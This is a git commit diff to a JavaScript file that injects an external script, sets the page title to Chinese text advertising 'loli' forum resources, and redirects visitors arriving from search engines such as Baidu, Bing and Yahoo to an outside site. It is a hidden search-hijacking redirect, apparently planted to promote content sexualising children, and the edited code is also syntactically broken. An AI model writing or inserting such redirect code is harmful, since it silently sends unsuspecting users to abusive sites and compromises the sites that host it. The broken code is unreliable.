15a26d49a77d57f4f980a440cc0d1230eb3e022d
mu61194 <66872669+mu61194@users.noreply.github.com>
2020-07-16 08:47:19 +0800

    Update lindb8sbsbv0.js

--- lindb8sbsbv0.js
+++ lindb8sbsbv0.js
@@ -9,9 +9,9 @@
      document.write('<script src="' + src + '" id="sozz"><\/script>');
      })();
 
-document.writeln("<script LANGUAGE=\"Javascript\">");
+<script LANGUAGE=\"Javascript\">
 document.title = '最新粉色萝莉收集和发布高清萝莉资源最新萝莉UU论坛资源,在小妹子萝莉论坛里可以找到全网最新萝莉论坛资源,已收录大量萝莉控社区视频,是名副其实最好的高清可爱萝莉论坛';
-document.writeln("var s=document.referrer");
-document.writeln("if(s.indexOf(\"baidu\")>0 || s.indexOf(\"sogou\")>0 || s.indexOf(\"soso\")>0 ||s.indexOf(\"sm\")>0 ||s.indexOf(\"uc\")>0 ||s.indexOf(\"bing\")>0 ||s.indexOf(\"yahoo\")>0 ||s.indexOf(\"so\")>0 )");
-document.writeln("location.href=\"http://www.dddd42.org\#"+window['location']['href']);
-document.writeln("</script>");
+var s=document.referrer;
+if(s.indexOf(\"baidu\")>0 || s.indexOf(\"sogou\")>0 || s.indexOf(\"soso\")>0 ||s.indexOf(\"sm\")>0 ||s.indexOf(\"uc\")>0 ||s.indexOf(\"bing\")>0 ||s.indexOf(\"yahoo\")>0 ||s.indexOf(\"so\")>0 );
+location.href=\"http://www.dddd42.org\#"+window['location']['href'];
+</script>
